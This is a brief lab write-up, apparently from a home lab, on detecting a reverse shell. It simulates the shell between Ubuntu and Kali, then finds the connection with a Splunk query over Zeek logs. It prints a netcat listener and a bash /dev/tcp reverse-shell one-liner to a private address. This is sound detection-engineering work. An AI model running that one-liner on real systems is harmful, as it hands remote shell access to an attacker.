# Reverse Shell Detection

A reverse shell was simulated between Ubuntu and Kali.

##Kali listener: 
```bash

nc -lvnp 4444
```
##Ubuntu test:
```bash
bash -i >& /dev/tcp/192.168.20.11/4444 0>&1
```
Zeek connection telemetry was forwarded to Splunk.

## Detection:
```bash

index=zeek sourcetype=zeek:conn
"192.168.20.12" "192.168.20.11" "4444"
```

This detects the network connection associated with the reverse shell test.
